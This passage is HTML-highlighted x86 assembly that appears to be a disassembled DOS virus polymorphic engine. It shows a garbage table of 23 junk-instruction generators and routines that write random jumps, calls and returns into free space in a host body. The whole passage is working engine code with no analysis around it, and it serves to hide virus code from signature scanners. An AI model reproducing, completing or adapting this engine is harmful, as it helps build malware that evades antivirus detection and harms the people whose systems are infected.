        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">trash_selector</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc1">; ¸     ; mov AX,</span><span class="sc0">
</span><span class="sc5">start_of_free</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">403h</span><span class="sc0">         </span><span class="sc1">; ...</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">loc_0_3DF</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">trash_selector</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">unk_0_3E6</span><span class="sc0">

</span><span class="sc5">loc_0_3DF</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3Dh</span><span class="sc0"> </span><span class="sc1">; =     ; CMP AX, word</span><span class="sc0">
</span><span class="sc5">end_free_blck1</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">1403h</span><span class="sc0">        </span><span class="sc1">; ...</span><span class="sc0">

        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">trash_selector</span><span class="sc0">

</span><span class="sc5">unk_0_3E6</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc1">; ¸     ; ...</span><span class="sc0">
                    </span><span class="sc1">; mov AX, word</span><span class="sc0">
</span><span class="sc5">end_app_block1</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">2400h</span><span class="sc0">        </span><span class="sc1">; ...</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">trash_selector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">23</span><span class="sc0">      </span><span class="sc1">; select 1 of 23 types</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_to_AX</span><span class="sc0">   </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; double the value</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; select one of the garbage types</span><span class="sc0">

</span><span class="sc5">trash_selector</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">garbage_table</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">trash_generator</span><span class="sc0">

</span><span class="sc1">; offsets to all code generation subroutines</span><span class="sc0">
</span><span class="sc5">garbage_table</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">JMP_and_CALL</span><span class="sc0">  </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OPER_R_RM</span><span class="sc0"> </span><span class="sc1">; aritm&amp;log operation,MOV,CMP reg,reg/mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MOVREG_IMM</span><span class="sc0">    </span><span class="sc1">; MOV reg, byte or word</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OPERAL_IM_MEM</span><span class="sc0"> </span><span class="sc1">; ??? al, reg/mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PUSH_OR_POPsreg</span><span class="sc1">; push or pop segment register</span><span class="sc0">
                    </span><span class="sc1">; sometimes put segment override</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BYTE_OP_WORD_RG</span><span class="sc1">; 1 byte opcodes, operations with</span><span class="sc0">
                    </span><span class="sc1">; 16 bit registers</span><span class="sc0">
                    </span><span class="sc1">; DEC,INC,XCHG AX,reg, PUSH, POP</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BYTE_OP_WORD_RG</span><span class="sc1">; operations with 16 bit registers,</span><span class="sc0">
                    </span><span class="sc1">; one byte long ,DEC reg,INC reg,</span><span class="sc0">
                    </span><span class="sc1">; XCHG AX,reg (NOP included), PUSH reg</span><span class="sc0">
                    </span><span class="sc1">; POP reg.</span><span class="sc0">
                    </span><span class="sc1">; in all cases is SP excluded</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ONE_BYTE_TRASH</span><span class="sc1">; PUSHF,DAA,DAS,AAA,AAS,CBW,CWD,SAHF,</span><span class="sc0">
                    </span><span class="sc1">; LAHF,CMPSB,LODSB,SCASB,XLAT,CMC,STC,</span><span class="sc0">
                    </span><span class="sc1">; CLC,STI,CLI,CLD,STD,CMPSW,LODSW,SCASW</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AAM_AAD_INreg</span><span class="sc0"> </span><span class="sc1">; AAM byte, AAD byte, IN AL, byte port</span><span class="sc0">
                    </span><span class="sc1">; IN AX,byte port</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PUSH_</span><span class="sc0">     </span><span class="sc1">; push word on stack</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">XCHG_REG_REG</span><span class="sc0">  </span><span class="sc1">; exchage register with register</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LEA_LDS_LES_</span><span class="sc0">  </span><span class="sc1">; LEA, LDS, LES reg16,mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ArOp1_2_Grp1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MUL_and_IMUL</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NOT_and_NEG</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SHFT_1orCL</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">JCND_LOOP_JSRT</span><span class="sc1">; shotr&amp;conditional jumps, loops</span><span class="sc0">
                    </span><span class="sc1">; with lenght of 0 bytes</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stact_biz</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MOV_POP_MEM</span><span class="sc0">   </span><span class="sc1">; mov memory,AX/L, POP memory</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LG_ARI_MOV_8bit</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GRP1_to_GRP3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ROTATIONS</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">grp_MEM_MEM_iMM</span><span class="sc0">

</span><span class="sc5">JMP_and_CALL</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">lahf</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">      </span><span class="sc1">; store flags to BP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prepare_stack</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">not_from_select</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">      </span><span class="sc1">; restore flags</span><span class="sc0">
        </span><span class="sc6">sahf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">not_from_select</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">loc_0_4B4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">si_is_0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">pop_1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_watch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">generate_ret_w</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_watch</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_watch</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_watch</span><span class="sc0">

</span><span class="sc5">generate_ret_w</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">JIM_Batez</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc1">; ¸     ; MOV AX, word</span><span class="sc0">
</span><span class="sc5">pop_1</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">clear_stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_watch</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_to_AX</span><span class="sc0">   </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">gen_ret_near</span><span class="sc0">    </span><span class="sc1">; ax - how many words to pop</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; convert #of words to bytes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C2h</span><span class="sc0">    </span><span class="sc1">; ret word</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_word</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">set_new_bx</span><span class="sc0">

</span><span class="sc5">gen_ret_near</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">    </span><span class="sc1">; retn</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">

</span><span class="sc5">set_new_bx</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; this sets BX for generation of next</span><span class="sc0">
                    </span><span class="sc1">; instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">updte_ins_pntr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">not_from_select</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">call_jmp</span><span class="sc0">

</span><span class="sc5">si_is_0</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">loc_0_4B4</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_watch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">call_jmp</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">sahf</span><span class="sc0">            </span><span class="sc1">; put flags back</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">loc_0_4DF</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_to_AX</span><span class="sc0">   </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">    </span><span class="sc1">; generate jmp near</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">is_jmp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; generate call near</span><span class="sc0">

</span><span class="sc5">is_jmp</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">  </span><span class="sc1">; write opcode</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_word</span><span class="sc0">  </span><span class="sc1">; and 2 random bytez</span><span class="sc0">

</span><span class="sc5">loc_0_4DF</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc0"> </span><span class="sc1">; ¾     ; mov si,word</span><span class="sc0">
</span><span class="sc5">mvd_bdy_200_1</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc1">; ¸     ; mov ax,</span><span class="sc0">
</span><span class="sc5">read_position</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">403h</span><span class="sc0">         </span><span class="sc1">; ...</span><span class="sc0">

        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">loc_0_4F2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">compute_jmp_siz</span><span class="sc0">

</span><span class="sc5">loc_0_4F2</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; adress pointer to store next byte</span><span class="sc0">
                    </span><span class="sc1">; - in this case end of jmp or call</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">lower_limit</span><span class="sc1">; can't generate code below this</span><span class="sc0">
                    </span><span class="sc1">; adress</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">enough_space?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">end_app_block1</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">enough_space?</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">end_free_blck1</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">loc_0_530</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">start_of_free</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">enough_space?</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">lower_limit</span><span class="sc1">; can't generate code below this</span><span class="sc0">
                    </span><span class="sc1">; adress</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">loc_0_529</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">start_of_free</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">enough_space?</span><span class="sc0">

</span><span class="sc5">loc_0_529</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">lower_limit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc1">; can't generate code below this</span><span class="sc0">
                    </span><span class="sc1">; adress</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">enough_space?</span><span class="sc0">

</span><span class="sc5">loc_0_530</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">end_app_block1</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">loc_0_543</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">end_free_blck1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">enough_space?</span><span class="sc0">

</span><span class="sc5">loc_0_543</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">end_app_block1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">enough_space?</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">continue_it</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BBh</span><span class="sc0"> </span><span class="sc1">; »     ; MOV BX,word</span><span class="sc0">
</span><span class="sc5">updte_ins_pntr</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
                    </span><span class="sc1">; put new value in instruction</span><span class="sc0">
